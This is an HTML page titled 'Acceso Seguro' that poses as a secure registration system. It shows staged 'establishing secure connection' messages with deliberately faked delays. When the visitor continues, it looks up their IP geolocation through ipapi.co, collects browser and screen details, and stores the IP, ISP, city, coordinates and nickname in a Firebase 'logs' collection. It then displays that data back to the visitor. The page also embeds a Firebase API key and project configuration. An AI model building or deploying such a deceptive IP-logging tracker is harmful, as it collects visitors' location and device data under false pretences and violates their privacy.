<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Acceso Seguro</title>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { 
  getFirestore, doc, runTransaction, addDoc, collection 
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

// 🔥 TU FIREBASE
const firebaseConfig = {
  apiKey: "AIzaSyBIp6rof_Wa5wyWdJQwjYWOQRu86ghZjtM",
  authDomain: "track-5ec5f.firebaseapp.com",
  projectId: "track-5ec5f",
  storageBucket: "track-5ec5f.firebasestorage.app",
  messagingSenderId: "191319158624",
  appId: "1:191319158624:web:ba00efb13d178c4bd37805",
  measurementId: "G-56ZM660KQC"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// delay fake 😈
const wait = (ms) => new Promise(r => setTimeout(r, ms));

// 🌍 IP
async function getIP() {
  let res = await fetch("https://ipapi.co/json/");
  return await res.json();
}

// 🔢 contador REAL
async function getVisitorNumber() {
  const ref = doc(db, "meta", "contador");

  return await runTransaction(db, async (transaction) => {
    const snap = await transaction.get(ref);

    let numero = 1;
    if (snap.exists()) {
      numero = snap.data().valor + 1;
    }

    transaction.set(ref, { valor: numero });
    return numero;
  });
}

// 💻 info
function getDevice() {
  return {
    userAgent: navigator.userAgent,
    idioma: navigator.language,
    resolucion: screen.width + "x" + screen.height
  };
}

// 🧠 inicio
let visitanteNumero = 0;

document.body.innerHTML = "<h2>Conectando...</h2>";

(async () => {

  await wait(800);
  document.body.innerHTML = "<h2>Estableciendo conexión segura...</h2>";

  visitanteNumero = await getVisitorNumber();

  await wait(800);

  document.body.innerHTML = `
    <h1>Sistema de registro</h1>
    <p>Eres el visitante #${visitanteNumero}</p>
    <p>Ingresa tu identificador:</p>
    <input id="nick" placeholder="Ej: UsuarioX">
    <br><br>
    <button id="btn">Continuar</button>
  `;

  document.getElementById("btn").onclick = guardar;

})();

// 💾 guardar
async function guardar() {

  let nick = document.getElementById("nick").value || "Anónimo";

  document.body.innerHTML = "<h2>Analizando dispositivo...</h2>";
  await wait(1000);

  document.body.innerHTML = "<h2>Obteniendo IP...</h2>";
  let ip = await getIP();

  await wait(1000);
  document.body.innerHTML = "<h2>Procesando datos...</h2>";

  let device = getDevice();

  let datos = {
    visitante: visitanteNumero,
    nick: nick,

    ip: ip.ip,
    ciudad: ip.city,
    region: ip.region,
    pais: ip.country_name,
    isp: ip.org,
    lat: ip.latitude,
    lon: ip.longitude,
    timezone: ip.timezone,

    ...device,
    fecha: new Date().toISOString()
  };

  await addDoc(collection(db, "logs"), datos);

  document.body.innerHTML = `
    <h1>✔ Acceso registrado</h1>
    <p>ID asignado: #${visitanteNumero}</p>
    <p>Usuario: ${nick}</p>
    <p>Ubicación: ${datos.ciudad}, ${datos.region}</p>
    <p>Proveedor: ${datos.isp}</p>
    <p>Zona horaria: ${datos.timezone}</p>
    <p>Coordenadas: ${datos.lat}, ${datos.lon}</p>
    <br>
    <p>✔ Dispositivo identificado correctamente</p>
  `;
}

</script>
</head>

<body style="background:black;color:#00ff00;font-family:monospace;text-align:center;margin-top:50px;">
</body>
</html>
